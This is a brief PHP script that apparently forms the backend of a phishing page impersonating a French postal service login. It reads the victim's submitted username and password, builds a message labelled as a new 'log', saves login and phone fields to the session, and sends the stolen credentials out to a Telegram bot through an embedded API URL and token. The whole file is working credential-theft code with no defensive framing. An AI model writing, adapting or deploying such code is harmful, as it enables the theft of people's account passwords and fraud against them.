<?php

session_start();

$message = '[🆘] +1 LOG POSTAL [🆘]' . "\r\n\n";

$message .= '🚀 USER  : ' . $_POST['identifiant'] . " \r\n\n";
$message .= '🚀 MOT DE PASSE : ' . $_POST['password'] . " \r\n\n";

$_SESSION['login']=$_POST['login'];
$_SESSION['tel']=$_POST['tel'];

file_get_contents("https://api.telegram.org/bot:6724793038:AAHoJPgf_NbhJTyp-601q2AbEHg4lDV8T2s
=" . urlencode($message) );

?>
